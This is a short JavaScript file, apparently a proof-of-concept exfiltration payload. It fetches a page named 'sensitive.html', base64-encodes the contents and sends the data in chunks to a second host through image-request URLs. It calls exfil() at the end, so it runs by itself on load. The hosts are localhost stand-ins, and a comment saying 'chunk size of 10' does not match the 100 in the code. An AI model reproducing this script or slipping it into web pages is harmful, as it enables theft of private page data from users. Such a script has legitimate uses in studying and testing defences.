function make_chunks(data) {
    // Using chunk size of 10
    chunks = data.match(/.{1,100}/g);
    return chunks;
}
function send_exfil(index,chunk) {
    var img = new Image();
    img.src = "http://127.0.0.1:1337/?index=" + index + "&chunk=" + chunk;
}

function exfil() {
    let xhr = new XMLHttpRequest();
    xhr.open('get', 'http://127.0.0.1:9999/sensitive.html');
    xhr.send();

    xhr.onload = function() {
        data = xhr.response;
        chunks_arr = make_chunks(btoa(data)); // make chunks of encoded data
        for (i = 0; i < chunks_arr.length; i++) {
            send_exfil(i,chunks_arr[i]);
        }
    };
}

exfil();